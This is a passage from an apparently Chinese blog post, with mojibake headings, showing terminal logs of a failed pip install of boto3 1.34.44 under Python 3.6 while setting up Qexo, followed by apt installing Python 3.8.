1.19.10, 1.19.11, 1.19.12, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.20.4, 1.20.5, 1.20.6, 1.20.7, 1.20.8, 1.20.9, 1.20.10, 1.20.11, 1.20.12, 1.20.13, 1.20.14, 1.20.15, 1.20.16, 1.20.17, 1.20.18, 1.20.19, 1.20.20, 1.20.21, 1.20.22, 1.20.23, 1.20.24, 1.20.25, 1.20.26, 1.20.27, 1.20.28, 1.20.29, 1.20.30, 1.20.31, 1.20.32, 1.20.33, 1.20.34, 1.20.35, 1.20.36, 1.20.37, 1.20.38, 1.20.39, 1.20.40, 1.20.41, 1.20.42, 1.20.43, 1.20.44, 1.20.45, 1.20.46, 1.20.47, 1.20.48, 1.20.49, 1.20.50, 1.20.51, 1.20.52, 1.20.53, 1.20.54, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5, 1.21.6, 1.21.7, 1.21.8, 1.21.9, 1.21.10, 1.21.11, 1.21.12, 1.21.13, 1.21.14, 1.21.15, 1.21.16, 1.21.17, 1.21.18, 1.21.19, 1.21.20, 1.21.21, 1.21.22, 1.21.23, 1.21.24, 1.21.25, 1.21.26, 1.21.27, 1.21.28, 1.21.29, 1.21.30, 1.21.31, 1.21.32, 1.21.33, 1.21.34, 1.21.35, 1.21.36, 1.21.37, 1.21.38, 1.21.39, 1.21.40, 1.21.41, 1.21.42, 1.21.43, 1.21.44, 1.21.45, 1.21.46, 1.22.0, 1.22.1, 1.22.2, 1.22.3, 1.22.4, 1.22.5, 1.22.6, 1.22.7, 1.22.8, 1.22.9, 1.22.10, 1.22.11, 1.22.12, 1.22.13, 1.23.0, 1.23.1, 1.23.2, 1.23.3, 1.23.4, 1.23.5, 1.23.6, 1.23.7, 1.23.8, 1.23.9, 1.23.10)<br>ERROR: No matching distribution found <span class="hljs-keyword">for</span> boto3==1.34.44<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># pip3 install boto3</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> Python 3.6.<br>  from cryptography.utils import int_from_bytes<br>Collecting boto3<br>  Using cached boto3-1.23.10-py3-none-any.whl (132 kB)<br>Collecting s3transfer&lt;0.6.0,&gt;=0.5.0<br>  Downloading s3transfer-0.5.2-py3-none-any.whl (79 kB)<br>     |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 79 kB 142 kB/s            <br>Collecting botocore&lt;1.27.0,&gt;=1.26.10<br>  Downloading botocore-1.26.10-py3-none-any.whl (8.8 MB)<br>     |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 8.8 MB 5.3 kB/s            <br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1<br>  Using cached jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.27.0,&gt;=1.26.10-&gt;boto3) (2.6.1)<br>Collecting urllib3&lt;1.27,&gt;=1.25.4<br>  Downloading urllib3-1.26.20-py2.py3-none-any.whl (144 kB)<br>     |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 144 kB 17 kB/s            <br>Installing collected packages: urllib3, jmespath, botocore, s3transfer, boto3<br>  Attempting uninstall: urllib3<br>    Found existing installation: urllib3 1.22<br>    Uninstalling urllib3-1.22:<br>      Successfully uninstalled urllib3-1.22<br>Successfully installed boto3-1.23.10 botocore-1.26.10 jmespath-0.10.0 s3transfer-0.5.2 urllib3-1.26.20<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># pip install boto3==1.34.44</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> Python 3.6.<br>  from cryptography.utils import int_from_bytes<br>ERROR: Could not find a version that satisfies the requirement boto3==1.34.44 (from versions: 0.0.1, 0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.0.8, 0.0.9, 0.0.10, 0.0.11, 0.0.12, 0.0.13, 0.0.14, 0.0.16, 0.0.17, 0.0.18, 0.0.19, 0.0.20, 0.0.21, 0.0.22, 1.0.0, 1.0.1, 1.1.0, 1.1.1, 1.1.2, 1.1.3, 1.1.4, 1.2.0, 1.2.1, 1.2.2, 1.2.3, 1.2.4, 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.4.0, 1.4.1, 1.4.2, 1.4.3, 1.4.4, 1.4.5, 1.4.6, 1.4.7, 1.4.8, 1.5.0, 1.5.1, 1.5.2, 1.5.3, 1.5.4, 1.5.5, 1.5.6, 1.5.7, 1.5.8, 1.5.9, 1.5.10, 1.5.11, 1.5.12, 1.5.13, 1.5.14, 1.5.15, 1.5.16, 1.5.17, 1.5.18, 1.5.19, 1.5.20, 1.5.21, 1.5.22, 1.5.23, 1.5.24, 1.5.25, 1.5.26, 1.5.27, 1.5.28, 1.5.29, 1.5.30, 1.5.31, 1.5.32, 1.5.33, 1.5.34, 1.5.35, 1.5.36, 1.6.0, 1.6.1, 1.6.2, 1.6.3, 1.6.4, 1.6.5, 1.6.6, 1.6.7, 1.6.8, 1.6.9, 1.6.10, 1.6.11, 1.6.12, 1.6.13, 1.6.14, 1.6.15, 1.6.16, 1.6.17, 1.6.18, 1.6.19, 1.6.20, 1.6.21, 1.6.22, 1.6.23, 1.7.0, 1.7.1, 1.7.2, 1.7.3, 1.7.4, 1.7.5, 1.7.6, 1.7.7, 1.7.8, 1.7.9, 1.7.10, 1.7.11, 1.7.12, 1.7.13, 1.7.14, 1.7.15, 1.7.16, 1.7.17, 1.7.18, 1.7.19, 1.7.20, 1.7.21, 1.7.22, 1.7.23, 1.7.24, 1.7.25, 1.7.26, 1.7.27, 1.7.28, 1.7.29, 1.7.30, 1.7.31, 1.7.32, 1.7.33, 1.7.34, 1.7.35, 1.7.36, 1.7.37, 1.7.38, 1.7.39, 1.7.40, 1.7.41, 1.7.42, 1.7.43, 1.7.44, 1.7.45, 1.7.46, 1.7.47, 1.7.48, 1.7.49, 1.7.50, 1.7.51, 1.7.52, 1.7.53, 1.7.54, 1.7.55, 1.7.56, 1.7.57, 1.7.58, 1.7.59, 1.7.60, 1.7.61, 1.7.62, 1.7.63, 1.7.64, 1.7.65, 1.7.66, 1.7.67, 1.7.68, 1.7.69, 1.7.70, 1.7.71, 1.7.72, 1.7.73, 1.7.74, 1.7.75, 1.7.76, 1.7.77, 1.7.78, 1.7.79, 1.7.80, 1.7.81, 1.7.82, 1.7.83, 1.7.84, 1.8.0, 1.8.1, 1.8.2, 1.8.3, 1.8.4, 1.8.5, 1.8.6, 1.8.7, 1.8.8, 1.8.9, 1.9.0, 1.9.1, 1.9.2, 1.9.3, 1.9.4, 1.9.5, 1.9.6, 1.9.7, 1.9.8, 1.9.9, 1.9.10, 1.9.11, 1.9.12, 1.9.13, 1.9.14, 1.9.15, 1.9.16, 1.9.17, 1.9.18, 1.9.19, 1.9.20, 1.9.21, 1.9.22, 1.9.23, 1.9.24, 1.9.25, 1.9.26, 1.9.27, 1.9.28, 1.9.29, 1.9.30, 1.9.31, 1.9.32, 1.9.33, 1.9.34, 1.9.35, 1.9.36, 1.9.37, 1.9.38, 1.9.39, 1.9.40, 1.9.41, 1.9.42, 1.9.43, 1.9.44, 1.9.45, 1.9.46, 1.9.47, 1.9.48, 1.9.49, 1.9.50, 1.9.51, 1.9.52, 1.9.53, 1.9.54, 1.9.55, 1.9.56, 1.9.57, 1.9.58, 1.9.59, 1.9.60, 1.9.61, 1.9.62, 1.9.63, 1.9.64, 1.9.65, 1.9.66, 1.9.67, 1.9.68, 1.9.69, 1.9.70, 1.9.71, 1.9.72, 1.9.73, 1.9.74, 1.9.75, 1.9.76, 1.9.77, 1.9.78, 1.9.79, 1.9.80, 1.9.81, 1.9.82, 1.9.83, 1.9.84, 1.9.85, 1.9.86, 1.9.87, 1.9.88, 1.9.89, 1.9.90, 1.9.91, 1.9.92, 1.9.93, 1.9.94, 1.9.95, 1.9.96, 1.9.97, 1.9.98, 1.9.99, 1.9.100, 1.9.101, 1.9.102, 1.9.103, 1.9.104, 1.9.105, 1.9.106, 1.9.107, 1.9.108, 1.9.109, 1.9.110, 1.9.111, 1.9.112, 1.9.113, 1.9.114, 1.9.115, 1.9.116, 1.9.117, 1.9.118, 1.9.119, 1.9.120, 1.9.121, 1.9.122, 1.9.123, 1.9.124, 1.9.125, 1.9.126, 1.9.127, 1.9.128, 1.9.129, 1.9.130, 1.9.131, 1.9.132, 1.9.133, 1.9.134, 1.9.135, 1.9.136, 1.9.137, 1.9.138, 1.9.139, 1.9.140, 1.9.141, 1.9.142, 1.9.143, 1.9.144, 1.9.145, 1.9.146, 1.9.147, 1.9.148, 1.9.149, 1.9.150, 1.9.151, 1.9.152, 1.9.153, 1.9.154, 1.9.155, 1.9.156, 1.9.157, 1.9.158, 1.9.159, 1.9.160, 1.9.161, 1.9.162, 1.9.163, 1.9.164, 1.9.165, 1.9.166, 1.9.167, 1.9.168, 1.9.169, 1.9.170, 1.9.171, 1.9.172, 1.9.173, 1.9.174, 1.9.175, 1.9.176, 1.9.177, 1.9.178, 1.9.179, 1.9.180, 1.9.181, 1.9.182, 1.9.183, 1.9.184, 1.9.185, 1.9.186, 1.9.187, 1.9.188, 1.9.189, 1.9.190, 1.9.191, 1.9.192, 1.9.193, 1.9.194, 1.9.195, 1.9.196, 1.9.197, 1.9.198, 1.9.199, 1.9.200, 1.9.201, 1.9.202, 1.9.203, 1.9.204, 1.9.205, 1.9.206, 1.9.207, 1.9.208, 1.9.209, 1.9.210, 1.9.211, 1.9.212, 1.9.213, 1.9.214, 1.9.215, 1.9.216, 1.9.217, 1.9.218, 1.9.219, 1.9.220, 1.9.221, 1.9.222, 1.9.223, 1.9.224, 1.9.225, 1.9.226, 1.9.227, 1.9.228, 1.9.229, 1.9.230, 1.9.231, 1.9.232, 1.9.233, 1.9.234, 1.9.235, 1.9.236, 1.9.237, 1.9.238, 1.9.239, 1.9.240, 1.9.241, 1.9.242, 1.9.243, 1.9.244, 1.9.245, 1.9.246, 1.9.247, 1.9.248, 1.9.249, 1.9.250, 1.9.251, 1.9.252, 1.9.253, 1.10.0, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.10.5, 1.10.6, 1.10.7, 1.10.8, 1.10.9, 1.10.10, 1.10.11, 1.10.12, 1.10.13, 1.10.14, 1.10.15, 1.10.16, 1.10.17, 1.10.18, 1.10.19, 1.10.20, 1.10.21, 1.10.22, 1.10.23, 1.10.24, 1.10.25, 1.10.26, 1.10.27, 1.10.28, 1.10.29, 1.10.30, 1.10.31, 1.10.32, 1.10.33, 1.10.34, 1.10.35, 1.10.36, 1.10.37, 1.10.38, 1.10.39, 1.10.40, 1.10.41, 1.10.42, 1.10.43, 1.10.44, 1.10.45, 1.10.46, 1.10.47, 1.10.48, 1.10.49, 1.10.50, 1.11.0, 1.11.1, 1.11.2, 1.11.3, 1.11.4, 1.11.5, 1.11.6, 1.11.7, 1.11.8, 1.11.9, 1.11.10, 1.11.11, 1.11.12, 1.11.13, 1.11.14, 1.11.15, 1.11.16, 1.11.17, 1.12.0, 1.12.1, 1.12.2, 1.12.3, 1.12.4, 1.12.5, 1.12.6, 1.12.7, 1.12.8, 1.12.9, 1.12.10, 1.12.11, 1.12.12, 1.12.13, 1.12.14, 1.12.15, 1.12.16, 1.12.17, 1.12.18, 1.12.19, 1.12.20, 1.12.21, 1.12.22, 1.12.23, 1.12.24, 1.12.25, 1.12.26, 1.12.27, 1.12.28, 1.12.29, 1.12.30, 1.12.31, 1.12.32, 1.12.33, 1.12.34, 1.12.35, 1.12.36, 1.12.37, 1.12.38, 1.12.39, 1.12.40, 1.12.41, 1.12.42, 1.12.43, 1.12.44, 1.12.45, 1.12.46, 1.12.47, 1.12.48, 1.12.49, 1.13.0, 1.13.1, 1.13.2, 1.13.3, 1.13.4, 1.13.5, 1.13.6, 1.13.7, 1.13.8, 1.13.9, 1.13.10, 1.13.11, 1.13.12, 1.13.13, 1.13.14, 1.13.15, 1.13.16, 1.13.17, 1.13.18, 1.13.19, 1.13.20, 1.13.21, 1.13.22, 1.13.23, 1.13.24, 1.13.25, 1.13.26, 1.14.0, 1.14.1, 1.14.2, 1.14.3, 1.14.4, 1.14.5, 1.14.6, 1.14.7, 1.14.8, 1.14.9, 1.14.10, 1.14.11, 1.14.12, 1.14.13, 1.14.14, 1.14.15, 1.14.16, 1.14.17, 1.14.18, 1.14.19, 1.14.20, 1.14.21, 1.14.22, 1.14.23, 1.14.24, 1.14.25, 1.14.26, 1.14.27, 1.14.28, 1.14.29, 1.14.30, 1.14.31, 1.14.32, 1.14.33, 1.14.34, 1.14.35, 1.14.36, 1.14.37, 1.14.38, 1.14.39, 1.14.40, 1.14.41, 1.14.42, 1.14.43, 1.14.44, 1.14.45, 1.14.46, 1.14.47, 1.14.48, 1.14.49, 1.14.50, 1.14.51, 1.14.52, 1.14.53, 1.14.54, 1.14.55, 1.14.56, 1.14.57, 1.14.58, 1.14.59, 1.14.60, 1.14.61, 1.14.62, 1.14.63, 1.15.0, 1.15.1, 1.15.2, 1.15.3, 1.15.4, 1.15.5, 1.15.6, 1.15.7, 1.15.8, 1.15.9, 1.15.10, 1.15.11, 1.15.12, 1.15.13, 1.15.14, 1.15.15, 1.15.16, 1.15.17, 1.15.18, 1.16.0, 1.16.1, 1.16.2, 1.16.3, 1.16.4, 1.16.5, 1.16.6, 1.16.7, 1.16.8, 1.16.9, 1.16.10, 1.16.11, 1.16.12, 1.16.13, 1.16.14, 1.16.15, 1.16.16, 1.16.17, 1.16.18, 1.16.19, 1.16.20, 1.16.21, 1.16.22, 1.16.23, 1.16.24, 1.16.25, 1.16.26, 1.16.27, 1.16.28, 1.16.29, 1.16.30, 1.16.31, 1.16.32, 1.16.33, 1.16.34, 1.16.35, 1.16.36, 1.16.37, 1.16.38, 1.16.39, 1.16.40, 1.16.41, 1.16.42, 1.16.43, 1.16.44, 1.16.45, 1.16.46, 1.16.47, 1.16.48, 1.16.49, 1.16.50, 1.16.51, 1.16.52, 1.16.53, 1.16.54, 1.16.55, 1.16.56, 1.16.57, 1.16.58, 1.16.59, 1.16.60, 1.16.61, 1.16.62, 1.16.63, 1.17.0, 1.17.1, 1.17.2, 1.17.3, 1.17.4, 1.17.5, 1.17.6, 1.17.7, 1.17.8, 1.17.9, 1.17.10, 1.17.11, 1.17.12, 1.17.13, 1.17.14, 1.17.15, 1.17.16, 1.17.17, 1.17.18, 1.17.19, 1.17.20, 1.17.21, 1.17.22, 1.17.23, 1.17.24, 1.17.25, 1.17.26, 1.17.27, 1.17.28, 1.17.29, 1.17.30, 1.17.31, 1.17.32, 1.17.33, 1.17.34, 1.17.35, 1.17.36, 1.17.37, 1.17.38, 1.17.39, 1.17.40, 1.17.41, 1.17.42, 1.17.43, 1.17.44, 1.17.45, 1.17.46, 1.17.47, 1.17.48, 1.17.49, 1.17.50, 1.17.51, 1.17.52, 1.17.53, 1.17.54, 1.17.55, 1.17.56, 1.17.57, 1.17.58, 1.17.59, 1.17.60, 1.17.61, 1.17.62, 1.17.63, 1.17.64, 1.17.65, 1.17.66, 1.17.67, 1.17.68, 1.17.69, 1.17.70, 1.17.71, 1.17.72, 1.17.73, 1.17.74, 1.17.75, 1.17.76, 1.17.77, 1.17.78, 1.17.79, 1.17.80, 1.17.81, 1.17.82, 1.17.83, 1.17.84, 1.17.85, 1.17.86, 1.17.87, 1.17.88, 1.17.89, 1.17.90, 1.17.91, 1.17.92, 1.17.93, 1.17.94, 1.17.95, 1.17.96, 1.17.97, 1.17.98, 1.17.99, 1.17.100, 1.17.101, 1.17.102, 1.17.103, 1.17.104, 1.17.105, 1.17.106, 1.17.107, 1.17.108, 1.17.109, 1.17.110, 1.17.111, 1.17.112, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.18.6, 1.18.7, 1.18.8, 1.18.9, 1.18.10, 1.18.11, 1.18.12, 1.18.13, 1.18.14, 1.18.15, 1.18.16, 1.18.17, 1.18.18, 1.18.19, 1.18.20, 1.18.21, 1.18.22, 1.18.23, 1.18.24, 1.18.25, 1.18.26, 1.18.27, 1.18.28, 1.18.29, 1.18.30, 1.18.31, 1.18.32, 1.18.33, 1.18.34, 1.18.35, 1.18.36, 1.18.37, 1.18.38, 1.18.39, 1.18.40, 1.18.41, 1.18.42, 1.18.43, 1.18.44, 1.18.45, 1.18.46, 1.18.47, 1.18.48, 1.18.49, 1.18.50, 1.18.51, 1.18.52, 1.18.53, 1.18.54, 1.18.55, 1.18.56, 1.18.57, 1.18.58, 1.18.59, 1.18.60, 1.18.61, 1.18.62, 1.18.63, 1.18.64, 1.18.65, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.19.6, 1.19.7, 1.19.8, 1.19.9, 1.19.10, 1.19.11, 1.19.12, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.20.4, 1.20.5, 1.20.6, 1.20.7, 1.20.8, 1.20.9, 1.20.10, 1.20.11, 1.20.12, 1.20.13, 1.20.14, 1.20.15, 1.20.16, 1.20.17, 1.20.18, 1.20.19, 1.20.20, 1.20.21, 1.20.22, 1.20.23, 1.20.24, 1.20.25, 1.20.26, 1.20.27, 1.20.28, 1.20.29, 1.20.30, 1.20.31, 1.20.32, 1.20.33, 1.20.34, 1.20.35, 1.20.36, 1.20.37, 1.20.38, 1.20.39, 1.20.40, 1.20.41, 1.20.42, 1.20.43, 1.20.44, 1.20.45, 1.20.46, 1.20.47, 1.20.48, 1.20.49, 1.20.50, 1.20.51, 1.20.52, 1.20.53, 1.20.54, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5, 1.21.6, 1.21.7, 1.21.8, 1.21.9, 1.21.10, 1.21.11, 1.21.12, 1.21.13, 1.21.14, 1.21.15, 1.21.16, 1.21.17, 1.21.18, 1.21.19, 1.21.20, 1.21.21, 1.21.22, 1.21.23, 1.21.24, 1.21.25, 1.21.26, 1.21.27, 1.21.28, 1.21.29, 1.21.30, 1.21.31, 1.21.32, 1.21.33, 1.21.34, 1.21.35, 1.21.36, 1.21.37, 1.21.38, 1.21.39, 1.21.40, 1.21.41, 1.21.42, 1.21.43, 1.21.44, 1.21.45, 1.21.46, 1.22.0, 1.22.1, 1.22.2, 1.22.3, 1.22.4, 1.22.5, 1.22.6, 1.22.7, 1.22.8, 1.22.9, 1.22.10, 1.22.11, 1.22.12, 1.22.13, 1.23.0, 1.23.1, 1.23.2, 1.23.3, 1.23.4, 1.23.5, 1.23.6, 1.23.7, 1.23.8, 1.23.9, 1.23.10)<br>ERROR: No matching distribution found <span class="hljs-keyword">for</span> boto3==1.34.44<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br><br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># pip install --upgrade pip</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> Python 3.6.<br>  from cryptography.utils import int_from_bytes<br>Requirement already satisfied: pip <span class="hljs-keyword">in</span> /usr/local/lib/python3.6/dist-packages (21.3.1)<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python -V</span><br>Python 3.6.9<br></code></pre></td></tr></table></figure><p>ç¡®è®¤å°è¯•å®‰è£…çš„ç‰ˆæœ¬å·ï¼ˆ1.34.44ï¼‰æ˜¯å¦ç¡®å®å­˜åœ¨ï¼šå­˜åœ¨<br>boto3 1.34.44ï¼š<a href="https://pypi.org/project/boto3/1.34.44/">boto3 Â· PyPI</a></p><h3 id="å°æ’æ›²ï¼šå°è¯•å‡çº§pythonç‰ˆæœ¬"><a href="#å°æ’æ›²ï¼šå°è¯•å‡çº§pythonç‰ˆæœ¬" class="headerlink" title="å°æ’æ›²ï¼šå°è¯•å‡çº§pythonç‰ˆæœ¬"></a>å°æ’æ›²ï¼šå°è¯•å‡çº§pythonç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># sudo apt update</span><br>Ign:1 https://download.docker.com/linux/ubuntu bionic InRelease<br>Err:2 https://download.docker.com/linux/ubuntu bionic Release                                           <br>  Could not handshake: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>. [IP: 18.155.68.15 443]<br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic InRelease                                                <br>Get:4 https://mirrors.aliyun.com/ubuntu bionic-security InRelease [102 kB]                           <br>Get:5 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease [102 kB]<br>Get:6 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease [102 kB]        <br>Hit:7 http://ppa.launchpad.net/kubuntu-ppa/backports/ubuntu bionic InRelease       <br>Get:8 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 DEP-11 Metadata [76.8 kB]<br>Get:9 https://mirrors.aliyun.com/ubuntu bionic-security/restricted amd64 DEP-11 Metadata [212 B]<br>Get:10 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 DEP-11 Metadata [61.9 kB]<br>Get:11 https://mirrors.aliyun.com/ubuntu bionic-security/multiverse amd64 DEP-11 Metadata [2,464 B]<br>Get:12 https://mirrors.aliyun.com/ubuntu bionic-updates/main amd64 DEP-11 Metadata [297 kB]<br>Get:13 https://mirrors.aliyun.com/ubuntu bionic-updates/restricted amd64 DEP-11 Metadata [212 B]<br>Get:14 https://mirrors.aliyun.com/ubuntu bionic-updates/universe amd64 DEP-11 Metadata [303 kB]<br>Get:15 https://mirrors.aliyun.com/ubuntu bionic-updates/multiverse amd64 DEP-11 Metadata [2,464 B]<br>Get:16 https://mirrors.aliyun.com/ubuntu bionic-backports/main amd64 DEP-11 Metadata [8,112 B]<br>Get:17 https://mirrors.aliyun.com/ubuntu bionic-backports/restricted amd64 DEP-11 Metadata [216 B]<br>Get:18 https://mirrors.aliyun.com/ubuntu bionic-backports/universe amd64 DEP-11 Metadata [10.1 kB]<br>Get:19 https://mirrors.aliyun.com/ubuntu bionic-backports/multiverse amd64 DEP-11 Metadata [216 B]<br>Reading package lists... Done              <br>E: The repository <span class="hljs-string">&#x27;https://download.docker.com/linux/ubuntu bionic Release&#x27;</span> no longer has a Release file.<br>N: Updating from such a repository can<span class="hljs-string">&#x27;t be done securely, and is therefore disabled by default.</span><br><span class="hljs-string">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# sudo apt install python3.8</span><br><span class="hljs-string">Reading package lists... Done</span><br><span class="hljs-string">Building dependency tree       </span><br><span class="hljs-string">Reading state information... Done</span><br><span class="hljs-string">The following additional packages will be installed:</span><br><span class="hljs-string">  libpython3.8-minimal libpython3.8-stdlib python3.8-minimal</span><br><span class="hljs-string">Suggested packages:</span><br><span class="hljs-string">  python3.8-venv python3.8-doc</span><br><span class="hljs-string">The following NEW packages will be installed:</span><br><span class="hljs-string">  libpython3.8-minimal libpython3.8-stdlib python3.8 python3.8-minimal</span><br><span class="hljs-string">0 upgraded, 4 newly installed, 0 to remove and 7 not upgraded.</span><br><span class="hljs-string">Need to get 4,542 kB of archives.</span><br><span class="hljs-string">After this operation, 18.4 MB of additional disk space will be used.</span><br><span class="hljs-string">Do you want to continue? [Y/n] y</span><br><span class="hljs-string">Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 libpython3.8-minimal amd64 3.8.0-3ubuntu1~18.04.2 [704 kB]</span><br><span class="hljs-string">Get:2 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 python3.8-minimal amd64 3.8.0-3ubuntu1~18.04.2 [1,807 kB]</span><br><span class="hljs-string">Get:3 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 libpython3.8-stdlib amd64 3.8.0-3ubuntu1~18.04.2 [1,676 kB]</span><br><span class="hljs-string">Get:4 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 python3.8 amd64 3.8.0-3ubuntu1~18.04.2 [355 kB]</span><br><span class="hljs-string">Fetched 4,542 kB in 1s (6,984 kB/s) </span><br><span class="hljs-string">Selecting previously unselected package libpython3.8-minimal:amd64.</span><br><span class="hljs-string">(Reading database ... 278125 files and directories currently installed.)</span><br><span class="hljs-string">Preparing to unpack .../libpython3.8-minimal_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking libpython3.8-minimal:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package python3.8-minimal.</span><br><span class="hljs-string">Preparing to unpack .../python3.8-minimal_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking python3.8-minimal (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package libpython3.8-stdlib:amd64.</span><br><span class="hljs-string">Preparing to unpack .../libpython3.8-stdlib_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking libpython3.8-stdlib:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package python3.8.</span><br><span class="hljs-string">Preparing to unpack .../python3.8_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking python3.8 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up libpython3.8-minimal:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up python3.8-minimal (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up libpython3.8-stdlib:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up python3.8 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Processing triggers for gnome-menus 